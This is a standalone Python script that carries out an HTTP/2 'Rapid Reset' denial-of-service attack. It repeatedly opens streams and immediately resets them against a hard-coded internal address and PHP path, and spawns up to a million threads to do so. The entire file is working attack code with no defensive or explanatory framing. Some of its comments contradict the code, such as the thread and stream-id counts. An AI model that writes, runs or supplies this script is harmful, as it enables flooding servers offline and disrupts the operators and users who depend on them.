import ssl
import sys
import csv
import socket
import argparse
import time
import threading

from datetime import datetime
from urllib.parse import urlparse
from http.client import HTTPConnection, HTTPSConnection

from h2.connection import H2Connection
from h2.config import H2Configuration

import httpx
import requests

hostname = "192.168.101.87"
port = "800"
uri = "/gao.php"

def send_rst_stream_h2(host, port, stream_id, uri_path='/', timeout=7, proxy=None):
    try:
        # Create an SSL context to ignore SSL certificate verification
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE

        # Create a connection based on whether a proxy is used
        if proxy and proxy != "":
            proxy_parts = urlparse(proxy)
            if port == 443:
                conn = HTTPSConnection(proxy_parts.hostname, proxy_parts.port, timeout=timeout, context=ssl_context)
                conn.set_tunnel(host, port)
            else:
                conn = HTTPConnection(proxy_parts.hostname, proxy_parts.port, timeout=timeout)
                conn.set_tunnel(host, port)
        else:
            if port == 443:
                conn = HTTPSConnection(host, port, timeout=timeout, context=ssl_context)
            else:
                conn = HTTPConnection(host, port, timeout=timeout)

        conn.connect()

        # Initiate HTTP/2 connection
        config = H2Configuration(client_side=True)
        h2_conn = H2Connection(config=config)
        h2_conn.initiate_connection()
        conn.send(h2_conn.data_to_send())

        # Send GET request headers
        headers = [(':method', 'GET'), (':authority', host), (':scheme', 'http'), (':path', uri_path)]

        while True:
            # Increment the stream id by 2 for odd values and check if it is less than 2000
            if stream_id % 2 != 0 and stream_id < 2500:
                h2_conn.send_headers(stream_id, headers, end_stream=True)
                h2_conn.reset_stream(stream_id, error_code=0x8)
                conn.send(h2_conn.data_to_send())
                stream_id += 2
                print(stream_id)
            elif stream_id >= 2500:
                break
        conn.close()
        return (0, "No response")
    except Exception as e:
        return (-1, f"send_rst_stream_h2 - {e}")

response , err = send_rst_stream_h2(hostname, port, 1, uri, proxy=None)
#print(response)
#print(err)
# Create 50 threads running root_function
threads = []
for i in range(1000000):
    thread = threading.Thread(target=send_rst_stream_h2, args=(hostname, port, 1, uri), kwargs={'proxy': None})
    thread.start()
    threads.append(thread)

# Keep the main thread alive
for thread in threads:
    thread.join()